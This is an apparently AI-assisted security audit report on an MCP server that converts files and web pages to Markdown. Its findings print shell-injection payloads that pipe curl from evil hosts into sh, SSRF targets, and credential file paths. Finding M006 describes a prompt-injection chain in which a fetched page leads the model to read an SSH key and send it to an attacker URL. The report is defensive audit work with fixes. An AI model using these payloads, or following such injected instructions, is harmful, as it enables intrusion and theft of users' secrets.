# Agent & MCP security report

Scanned: `/tmp/blind/c32` · 2026-11-23T17:44:05+00:00 · auditor v1.0.0 · mode: reviewed

## Verdict: 🔴 Fix before shipping

| Critical | High | Medium | Low | Info | Dismissed as false alarm | Needs context |
|---|---|---|---|---|---|---|
| 2 | 3 | 1 | 1 | 0 | 0 | 0 |

## What was checked

- MCP servers in config files: **0** · tools found in code: **10** · agent/MCP code files: **3** · agent instruction files: **0**
- Frameworks seen: mcp, modelcontextprotocol

## Findings

### M001 · CRITICAL · filepath tool argument pasted into a shell command
`None:None` · ASI05 Unexpected Code Execution

filepath from any *-to-markdown tool is placed inside double quotes in a string run by child_process.exec (a shell); a value like `x"; curl evil.sh | sh; "` or `$(id)` runs arbitrary commands.
> `src/server.ts:70` — `filePath: validatedArgs.filepath,`
> `src/Markdownify.ts:32` — ``${uvPath} run ${markitdownPath} "${filePath}"`,`

**Fix:** Use execFile(uvPath, ['run', markitdownPath, '--', filePath]) with no shell, and resolve filePath and check it is inside an allowed directory.

### M002 · CRITICAL · Hidden uvPath/projectRoot arguments choose the executable that is run
`None:None` · ASI05 Unexpected Code Execution

Every conversion tool accepts undeclared uvPath and projectRoot arguments from the caller and uses uvPath as the start of the shell command, so a call with uvPath `sh -c 'curl evil|sh' #` (or any program) runs it; the input schema does not list these fields but the zod schema accepts them.
> `src/server.ts:15` — `uvPath: z.string().optional(),`
> `src/server.ts:56` — `uvPath: validatedArgs.uvPath || process.env.UV_PATH,`
> `src/Markdownify.ts:32` — ``${uvPath} run ${markitdownPath} "${filePath}"`,`

**Fix:** Remove uvPath and projectRoot from RequestPayloadSchema; take them only from operator config (env), and use execFile without a shell.

### M003 · HIGH · URL tools fetch any URL and return the body
`None:None` · ASI02 Tool Misuse and Exploitation

youtube/bing/webpage-to-markdown fetch whatever URL the model gives with no scheme/host check, so http://169.254.169.254/... or http://localhost:port/admin is fetched and the converted body is returned to the model.
> `src/server.ts:54` — `url: validatedArgs.url,`
> `src/Markdownify.ts:67` — `const response = await fetch(url);`

**Fix:** Allow only https, resolve the host and block private/loopback/link-local/IPv6-local addresses, re-check on redirects (redirect: 'manual'), and restrict the YouTube/Bing tools to their own hosts.

### M004 · HIGH · get-markdown-file and the file tools read any file on disk
`None:None` · ASI02 Tool Misuse and Exploitation

filepath is used as-is with no root or containment check, so get-markdown-file with ~/.ssh/id_rsa, ~/.aws/credentials or .env returns the secret to the model (the conversion tools likewise pass any path to markitdown).
> `src/server.ts:81` — `filePath: validatedArgs.filepath,`
> `src/Markdownify.ts:103` — `const text = await fs.promises.readFile(filePath, "utf-8");`

**Fix:** Resolve the path with fs.realpath and require path.relative(allowedRoot, real) not to start with '..' (allowedRoot = the server's temp output dir for get-markdown-file and a configured input dir for the converters).

### M006 · HIGH · One server combines untrusted web input, local file read and an outbound fetch
`None:None` · ASI01 / ASI02 (untrusted input + private data + way out)

A page fetched by webpage-to-markdown can tell the model to read ~/.ssh/id_rsa with get-markdown-file and then call webpage-to-markdown with https://attacker/?d=<contents>, exfiltrating it with no approval step.
> `src/Markdownify.ts:103` — `const text = await fs.promises.readFile(filePath, "utf-8");`
> `src/Markdownify.ts:67` — `const response = await fetch(url);`

**Fix:** Restrict file reads to a sandbox directory, restrict fetch hosts, and require user approval for file-read tools in the client.

### M005 · MEDIUM · Fetched web pages and documents are returned raw into the model context
`None:None` · 

Text from any web page, search result, video transcript or document goes straight to the model unmarked; instructions hidden there can steer the model into the file-read and command-injection tools above.
> `src/Markdownify.ts:67` — `const response = await fetch(url);`
> `src/server.ts:93` — `{ type: "text", text: result.text },`

**Fix:** Wrap returned content in clearly delimited untrusted-data markers and tell the client it is untrusted; fixing M001-M004 limits what injected text can trigger.

### M007 · LOW · npm preinstall pipes a remote installer into sh
`None:None` · ASI04 Agentic Supply Chain

Installing the package runs an unpinned remote script with the installer's privileges; a compromise of that URL compromises every install.
> `package.json:20` — `"preinstall": "./setup.sh",`
> `setup.sh:5` — `curl -LsSf https://astral.sh/uv/install.sh | sh`

**Fix:** Document uv as a prerequisite instead of installing it in preinstall, or pin a specific uv version and verify its checksum.

## Limits

- Static review: the auditor reads code and configs; it does not run servers or attack them. Logic bugs, auth flaws in other services and runtime behaviour can be missed.
- Tool descriptions are checked as written in the code or a tools/list export; a remote server can return different text at runtime (use `pin --check` on exported tools.json).
- AI-assisted: findings are judged by an AI agent with every quote verified against the code; a human should confirm critical fixes.
